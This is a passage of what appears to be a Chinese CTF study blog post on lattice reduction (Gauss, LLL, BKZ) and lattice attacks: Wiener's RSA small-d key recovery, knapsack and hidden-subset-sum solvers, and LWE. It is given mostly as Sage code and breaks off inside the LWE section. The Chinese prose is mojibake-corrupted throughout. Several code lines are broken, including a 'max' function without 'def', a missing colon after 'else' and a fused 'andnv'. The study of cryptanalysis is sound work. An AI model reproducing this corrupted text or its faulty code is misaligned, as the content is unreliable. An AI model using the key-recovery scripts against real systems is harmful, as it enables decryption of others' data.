è®°$[\mu]ä¸ºè·\muæœ€è¿‘çš„æ•´æ•°$ã€‚$è§„å®šå¯¹äºæ•´æ•°nï¼Œ[n+\frac{1}{2}]çš„å€¼å–nã€‚$</p></li></ul></li><li><p><strong>ç®—æ³•æ­¥éª¤ï¼š</strong></p><ul><li><p><strong>è¾“å…¥ï¼š</strong> $äºŒç»´æ ¼Lçš„ä¸€ç»„åŸºx,yï¼Œå…¶ä¸­|x|&lt;|y|$</p></li><li><p><strong>è¾“å‡ºï¼š</strong> $æ ¼Lä¸­çš„ä¸€ç»„æœ€å°åŸºv_1,v_2$</p></li><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Gauss</span>(<span class="hljs-params">x,y</span>):<br>    v1,v2=x,y<br>    finished = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> finished:<br>        m=<span class="hljs-built_in">round</span>((v2.dot_product(v1)/v1.dot_product(v1)))<br>        v2 = v2 - m*v1<br>        <span class="hljs-keyword">if</span> v1.norm() &lt;= v2.norm():<br>            finished = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span><br>            v1,v2 = v2,v1<br>    <span class="hljs-keyword">return</span> v1,v2<br></code></pre></td></tr></table></figure></li></ul></li></ul><h4 id="LLLç®—æ³•"><a href="#LLLç®—æ³•" class="headerlink" title="LLLç®—æ³•"></a>LLLç®—æ³•</h4><ul><li><p><strong>ç®€ä»‹ï¼š</strong> LLLç®—æ³•å¯è§†ä¸ºé«˜æ–¯ç®—æ³•åœ¨é«˜ç»´æ ¼ä¸­çš„æ¨å¹¿ã€‚</p></li><li><p><strong>æ•ˆæœï¼š</strong> ä½¿æ–½å¯†ç‰¹æ­£äº¤åŒ–çš„ç¨‹åº¦æœ€å¤§åŒ–ï¼Œä»¥æ±‚è§£æœ€çŸ­å‘é‡é—®é¢˜</p></li><li><p><strong>ç®—æ³•æ­¥éª¤ï¼š</strong> </p><ul><li><p><strong>è¾“å…¥ï¼š</strong> $nç»´æ ¼çš„ä»»æ„ä¸€ç»„åŸº$ã€‚</p></li><li><p><strong>è¾“å‡ºï¼š</strong> ä»¥å¤šé¡¹å¼æ—¶é—´è¾“å‡ºä¸€ç»„LLLçº¦åŒ–åŸºã€‚</p></li><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-built_in">max</span>(a, b):<br>    <span class="hljs-keyword">return</span> a <span class="hljs-keyword">if</span> a &gt; b <span class="hljs-keyword">else</span> b<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">LLL_v0</span>(<span class="hljs-params">M, delta=<span class="hljs-number">0.75</span></span>):<br>    B = deepcopy(M)<br>    Q, mu = B.gram_schmidt()<br>    n, k = B.nrows(), <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">while</span> k &lt; n:<br><br>        <span class="hljs-comment"># size reduction step</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(k)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>( mu[k][j] ) &gt; <span class="hljs-number">0.5</span>:<br>                B[k] = B[k] - <span class="hljs-built_in">round</span>( mu[k][j] ) * B[j]<br>                Q, mu = B.gram_schmidt()<br><br>        <span class="hljs-comment"># swap step </span><br>        <span class="hljs-keyword">if</span> Q[k].dot_product(Q[k]) &gt;= (delta - mu[k][k-<span class="hljs-number">1</span>]^<span class="hljs-number">2</span>) * Q[k-<span class="hljs-number">1</span>].dot_product(Q[k-<span class="hljs-number">1</span>]):<br>            k = k + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            B[k], B[k-<span class="hljs-number">1</span>] = B[k-<span class="hljs-number">1</span>], B[k]<br>            Q, mu = B.gram_schmidt()<br>            k = <span class="hljs-built_in">max</span>(k-<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> B<br></code></pre></td></tr></table></figure></li><li></li></ul></li></ul><h4 id="BKZç®—æ³•"><a href="#BKZç®—æ³•" class="headerlink" title="BKZç®—æ³•"></a>BKZç®—æ³•</h4><ul><li><strong>ç®€ä»‹ï¼š</strong> çº¦åŒ–èƒ½åŠ›æ¯”LLLç®—æ³•æ›´å¼ºï¼Œä½¿ç”¨äº†KZçº¦åŒ–å’Œæ·±æ’æ³•ã€‚</li></ul><h4 id="L-2-ç®—æ³•"><a href="#L-2-ç®—æ³•" class="headerlink" title="$L^2$ ç®—æ³•"></a>$L^2$ ç®—æ³•</h4><ul><li><strong>ç®€ä»‹ï¼š</strong> æµ®ç‚¹å‹LLLç®—æ³•ï¼Œé‡‡ç”¨<strong>æµ®ç‚¹æ•°</strong>å’Œ<strong>å¤§æ•°è¿ç®—</strong>ç®—æ³•ä¼˜åŒ–è¿è¡Œæ—¶é—´ï¼Œå¹¶ä½¿ç”¨deepinsertionæå‡çº¦åŒ–èƒ½åŠ›ã€‚</li></ul><h4 id="BKZ-2-0"><a href="#BKZ-2-0" class="headerlink" title="BKZ 2.0"></a>BKZ 2.0</h4><ul><li><strong>ç®€ä»‹ï¼š</strong> BKZçš„ä¼˜åŒ–ç‰ˆæœ¬</li></ul><h2 id="äº”ã€é…å¹³"><a href="#äº”ã€é…å¹³" class="headerlink" title="äº”ã€é…å¹³"></a>äº”ã€é…å¹³</h2><ul><li><p><strong>ä¸ºä»€ä¹ˆè¦é…å¹³ï¼š</strong> å› ä¸ºåˆ©ç”¨æ ¼åŸºè§„çº¦è§£å†³çš„å…¶å®æ˜¯æœ€çŸ­å‘é‡é—®é¢˜ï¼Œè€Œä¸€äº›æƒ…å†µä¸‹ç›´æ¥æ„é€ çš„æ ¼ä¸æ»¡è¶³$|v|\le\sqrt n der(L)^{\frac1 n}$ ï¼Œä¹Ÿå°±æ˜¯è¯´æƒ³è¦æ±‚çš„å‘é‡åœ¨æ„é€ çš„æ ¼ä¸­ä¸æ˜¯æœ€çŸ­å‘é‡ã€‚å› æ­¤éœ€è¦é€šè¿‡é…å¹³æ¥ä½¿å…¶è¾¾åˆ°æœ€çŸ­ã€‚</p></li><li><p><strong>ä¾‹å­ï¼š</strong> </p><ul><li><p>å·²çŸ¥$h&#x3D;f^{-1}g \mod p$,å…¶ä¸­ç»™å‡º$(h,p)$ï¼Œæ±‚$(f,g)$ ,$f$ä¸º128bits$g$ä¸º64bits,$p$ä¸º250bitsã€‚</p></li><li><p>æ„é€ æ ¼</p></li></ul></li></ul><span>$$\begin{bmatrix}f & k\end{bmatrix}\begin{bmatrix}1 & h \\0 & p\end{bmatrix}=\begin{bmatrix}f & g\end{bmatrix}$$</span><ul><li>å³$vB&#x3D;w$ï¼Œå…¶ä¸­$w$å°±æ˜¯æˆ‘ä»¬æƒ³è¦æ±‚çš„å‘é‡ï¼Œè¦ä¿è¯å®ƒæ»¡è¶³æ˜¯æœ€çŸ­å‘é‡ï¼Œè€Œå®é™…</li></ul><span>$$ \|w\|\approx2^{128}  \\\sqrt{2p}\approx2^{125}$$</span>  <p>  è€Œä¸Šè¾¹æ˜¾ç„¶ä¸æ»¡è¶³ï¼Œå› æ­¤éœ€è¦è°ƒæ•´ã€‚ä»¤$D&#x3D;2^{10}$</p><span>$$\begin{bmatrix}f & k\end{bmatrix}\begin{bmatrix}1 & Dh \\0 & Dp\end{bmatrix}=\begin{bmatrix}f & Dg\end{bmatrix}$$</span><ul><li>æ­¤æ—¶</li></ul><span>$$\|w'\|\approx2^{128}\le\sqrt{2Dp}\approx2^{130}$$</span><ul><li>æ­¤æ—¶ä¾¿èƒ½è§£å‡º$wâ€™$ï¼Œæ±‚gæ—¶è¿˜éœ€å†é™¤ä»¥Dã€‚</li></ul><h2 id="å…­ã€å…¸å‹é¢˜å‹"><a href="#å…­ã€å…¸å‹é¢˜å‹" class="headerlink" title="å…­ã€å…¸å‹é¢˜å‹"></a>å…­ã€å…¸å‹é¢˜å‹</h2><h4 id="1-Wieneræ”»å‡»"><a href="#1-Wieneræ”»å‡»" class="headerlink" title="1.Wieneræ”»å‡»"></a>1.Wieneræ”»å‡»</h4><ul><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">D = <span class="hljs-number">2</span>^(n.nbits()//<span class="hljs-number">2</span>)<br>m = matrix(ZZ, [<br>  [D, n+<span class="hljs-number">1</span>],<br>  [<span class="hljs-number">0</span>, -e]<br>])<br>L = m.LLL()<br>w = L[<span class="hljs-number">0</span>]<br>v = m.solve_left(w)<br>k = <span class="hljs-built_in">abs</span>(v[<span class="hljs-number">0</span>])<br>d = <span class="hljs-built_in">abs</span>(v[<span class="hljs-number">1</span>])<br>phi = (e*d-<span class="hljs-number">1</span>) // k<br>p_plus_q = n + <span class="hljs-number">1</span> - phi<br>p_min_q = (p_plus_q^<span class="hljs-number">2</span> - <span class="hljs-number">4</span>*n)^(<span class="hljs-number">1</span>/<span class="hljs-number">2</span>)<br>p = (p_plus_q + p_min_q) // <span class="hljs-number">2</span><br>q = n // p<br><span class="hljs-keyword">assert</span> p*q == n<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = %s&#x27;</span> % p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q = %s&#x27;</span> % q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d = %s&#x27;</span> % d)<br></code></pre></td></tr></table></figure></li><li><p>æ”»å‡»æ¡ä»¶ï¼š$d&lt;\frac13N^{\frac14}$</p></li></ul><h4 id="2-01èƒŒåŒ…å¯†ç -Knapsack"><a href="#2-01èƒŒåŒ…å¯†ç -Knapsack" class="headerlink" title="2.01èƒŒåŒ…å¯†ç (Knapsack)"></a>2.01èƒŒåŒ…å¯†ç (Knapsack)</h4><ul><li><strong>æ„é€ ï¼š</strong></li></ul><span>$$(x_0,x_1,...,x_{n-1},-1)\begin{bmatrix}2 & 0 & 0 & \cdots & 0 & M_0 \\0 & 2 & 0 & \cdots & 0 & M_1 \\0 & 0 & 2 & \cdots & 0 & M_2 \\\vdots & \vdots & \vdots & \ddots & \vdots & \vdots \\0 & 0 & 0 & \cdots & 2 & M_{n-1} \\1 & 1 & 1 & \cdots & 1 & S\end{bmatrix}\\=(2x_0-1,2x_1-1,...2x_{n-1}-1,0)$$</span><blockquote><p>PSï¼šéœ€è¦é…å¹³æ—¶åœ¨æœ€åä¸€åˆ—åŠ ä¸Šç³»æ•°ã€‚</p></blockquote><ul><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits<br><span class="hljs-keyword">import</span> libnum<br>BITS = <span class="hljs-number">1024</span><br>fb = <span class="hljs-built_in">bin</span>(libnum.s2n(flag))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>*<span class="hljs-built_in">len</span>(flag))<br>fb = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> fb]<br><br>M = [getrandbits(BITS) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fb))]<br>S = <span class="hljs-built_in">sum</span>([fb[i]*M[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fb))])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;M = %s&#x27;</span> % M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;S = %s&#x27;</span> % S)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./out&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  <span class="hljs-built_in">exec</span>(f.read())<br>n = <span class="hljs-built_in">len</span>(M)<br><br>B = zero_matrix(ZZ, n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>  B[i, i] = <span class="hljs-number">2</span><br>  B[-<span class="hljs-number">1</span>, i] = <span class="hljs-number">1</span><br>  B[i, -<span class="hljs-number">1</span>] = M[i]<br>B[-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>] = S<br>L =B.LLL()<br><span class="hljs-built_in">print</span>(L[<span class="hljs-number">0</span>]) <span class="hljs-comment"># ç†è®ºä¸Šåªå«(-1, 0, 1)ä¸”åªæœ‰æœ€åä¸€ä½æ˜¯0ï¼Œå¦åˆ™æ˜¯æ²¡è§£å‡º</span><br><br><span class="hljs-keyword">import</span> libnum<br>fb = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>((li+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>]])<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(fb, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(flag) <span class="hljs-comment"># è‹¥è§£å‡º 2 xi - 1</span><br><br>fb = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>((li+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> li <span class="hljs-keyword">in</span> -L[<span class="hljs-number">0</span>][:-<span class="hljs-number">1</span>]])<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(fb, <span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(flag) <span class="hljs-comment"># è‹¥è§£å‡º 1 - 2 xi</span><br></code></pre></td></tr></table></figure></li><li><p>è§å¦ä¸€ç¯‡æ–‡ç« </p></li></ul><h4 id="3-HSSP-éšå­é›†å’Œé—®é¢˜"><a href="#3-HSSP-éšå­é›†å’Œé—®é¢˜" class="headerlink" title="3.HSSP(éšå­é›†å’Œé—®é¢˜)"></a>3.HSSP(éšå­é›†å’Œé—®é¢˜)</h4><ul><li><p><strong>æ¦‚è¿°ï¼š</strong> $w&#x3D;vG,å…¶ä¸­w,vå‡ä¸ºGF(p)ä¸Šçš„å‘é‡ï¼ŒGæ˜¯01çŸ©é˜µï¼Œå·²çŸ¥wï¼Œæ¢å¤çŸ©é˜µG$</p></li><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">60</span><br>m = <span class="hljs-number">330</span><br>p = ...<br>w = ...<br>MM = ...<br><br>e = <span class="hljs-number">0x10001</span><br>MM = matrix(GF(<span class="hljs-number">2</span>), MM)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allpmones</span>(<span class="hljs-params">v</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v)<br><br><span class="hljs-comment"># We generate the lattice of vectors orthogonal to b modulo x0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orthoLattice</span>(<span class="hljs-params">b, x0</span>):<br>    m = b.length()<br>    M = Matrix(ZZ, m, m)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        M[i, i] = <span class="hljs-number">1</span><br>    M[<span class="hljs-number">1</span>:m, <span class="hljs-number">0</span>] = -b[<span class="hljs-number">1</span>:m] * inverse_mod(b[<span class="hljs-number">0</span>], x0)<br>    M[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] = x0<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        M[i, <span class="hljs-number">0</span>] = mod(M[i, <span class="hljs-number">0</span>], x0)<br><br>    <span class="hljs-keyword">return</span> M<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allones</span>(<span class="hljs-params">v</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v):<br>        <span class="hljs-keyword">return</span> v<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([vj <span class="hljs-keyword">for</span> vj <span class="hljs-keyword">in</span> v <span class="hljs-keyword">if</span> vj <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>]]) == <span class="hljs-built_in">len</span>(v):<br>        <span class="hljs-keyword">return</span> -v<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recoverBinary</span>(<span class="hljs-params">M5</span>):<br>    lv = [allones(vi) <span class="hljs-keyword">for</span> vi <span class="hljs-keyword">in</span> M5 <span class="hljs-keyword">if</span> allones(vi)]<br>    n = M5.nrows()<br>    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> lv:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            nv = allones(M5[i] - v)<br>            <span class="hljs-keyword">if</span> nv andnv <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lv:<br>                lv.append(nv)<br>            nv = allones(M5[i] + v)<br>            <span class="hljs-keyword">if</span> nv <span class="hljs-keyword">and</span> nv <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> lv:<br>                lv.append(nv)<br>    <span class="hljs-keyword">return</span> Matrix(lv)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">kernelLLL</span>(<span class="hljs-params">M</span>):<br>    n = M.nrows()<br>    m = M.ncols()<br>    <span class="hljs-keyword">if</span> m &lt; <span class="hljs-number">2</span> * n:<br>        <span class="hljs-keyword">return</span> M.right_kernel().matrix()<br>    K = <span class="hljs-number">2</span> ^ (m // <span class="hljs-number">2</span>) * M.height()<br><br>    MB = Matrix(ZZ, m + n, m)<br>    MB[:n] = K * M<br>    MB[n:] = identity_matrix(m)<br><br>    MB2 = MB.T.LLL().T<br><br>    <span class="hljs-keyword">assert</span> MB2[:n, : m - n] == <span class="hljs-number">0</span><br>    Ke = MB2[n:, : m - n].T<br><br>    <span class="hljs-keyword">return</span> Ke<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">m, n, p, h</span>):<br>    <span class="hljs-comment"># This is the Nguyen-Stern attack, based on BKZ in the second step</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>, n, <span class="hljs-string">&quot;m =&quot;</span>, m)<br><br>    iota = <span class="hljs-number">0.035</span><br>    nx0 = <span class="hljs-built_in">int</span>(<span class="hljs-number">2</span> * iota * n ^ <span class="hljs-number">2</span> + n * log(n, <span class="hljs-number">2</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nx0 =&quot;</span>, nx0)<br><br>    x0 = p<br>    b = vector(h)<br><br>    <span class="hljs-comment"># only information we get</span><br>    M = orthoLattice(b, x0)<br><br>    t = cputime()<br>    M2 = M.LLL()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LLL step1: %.1f&quot;</span> % cputime(t))<br><br>    <span class="hljs-comment"># assert sum([vi == 0 and 1 or 0 for vi in M2 * X]) == m - n</span><br>    MOrtho = M2[: m - n]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  log(Height, 2) = &quot;</span>, <span class="hljs-built_in">int</span>(log(MOrtho.height(), <span class="hljs-number">2</span>)))<br><br>    t2 = cputime()<br>    ke = kernelLLL(MOrtho)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Kernel: %.1f&quot;</span> % cputime(t2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Total step1: %.1f&quot;</span> % cputime(t))<br><br>    <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">170</span>:<br>        <span class="hljs-keyword">return</span><br><br>    beta = <span class="hljs-number">2</span><br>    tbk = cputime()<br>    <span class="hljs-keyword">while</span> beta &lt; n:<br>        <span class="hljs-keyword">if</span> beta == <span class="hljs-number">2</span>:<br>            M5 = ke.LLL()<br>        <span class="hljs-keyword">else</span>:<br>            M5 = M5.BKZ(block_size=beta)<br><br>        <span class="hljs-comment"># we break when we only get vectors with &#123;-1,0,1&#125; components</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>([<span class="hljs-literal">True</span> <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> M5 <span class="hljs-keyword">if</span> allpmones(v)]) == n:<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> beta == <span class="hljs-number">2</span>:<br>            beta = <span class="hljs-number">10</span><br>        <span class="hljs-keyword">else</span>:<br>            beta += <span class="hljs-number">10</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BKZ beta=%d: %.1f&quot;</span> % (beta, cputime(tbk)))<br>    t2 = cputime()<br>    MB = recoverBinary(M5)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Recovery: %.1f&quot;</span> % cputime(t2))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Number of recovered vector = &quot;</span>, MB.nrows())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Number of recovered vector.T = &quot;</span>, MB.ncols())<br>    <span class="hljs-keyword">return</span> MB<br><br>res = attack(m, n, p, w)<br></code></pre></td></tr></table></figure></li><li><p>è¯¦ç»†è§å¦ä¸€ç¯‡æ–‡ç« </p></li></ul><h4 id="4-LWEï¼ˆå®¹é”™å­¦ä¹ é—®é¢˜ï¼‰"><a href="#4-LWEï¼ˆå®¹é”™å­¦ä¹ é—®é¢˜ï¼‰" class="headerlink" title="4.LWEï¼ˆå®¹é”™å­¦ä¹ é—®é¢˜ï¼‰"></a>4.LWEï¼ˆå®¹é”™å­¦ä¹ é—®é¢˜ï¼‰</h4><ul><li><strong>æ¦‚è¿°ï¼š</strong> $Ax+e&#x3D;b\mod q$ï¼Œå·²çŸ¥$A,b,q$ï¼ŒæœªçŸ¥$e$ï¼ˆå¾ˆå°ï¼‰ï¼Œæ±‚$x$ã€‚</li></ul><blockquote><p>å…¶ä¸­$A$æ˜¯$m*n$çŸ©é˜µï¼Œ$x$æ˜¯$n$ç»´å‘é‡ã€‚</p></blockquote><ul><li><strong>åˆ†æï¼š</strong></li></ul><span>$$Ax+e=b+kqI_m \\Ax+kqI_m=b-e \\(A|qI_m)\begin{pmatrix}x \\k\end{pmatrix}=b-e \\è½¬ç½®ä¸€ä¸‹ï¼š(x|k)\begin{pmatrix}A^T \\qI_m\end{pmatrix} =(b-e)^T\\å¦ä¸€ç§ç»„åˆï¼š(qI_m|A)\begin{pmatrix}k \\x\end{pmatrix}=b-e \\è½¬ç½®ä¸€ä¸‹ï¼š(k|x)\begin{pmatrix}qI_m \\A^T\end{pmatrix} =(b-e)^T\\$$</span><ul><li><p><strong>ä»£ç ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 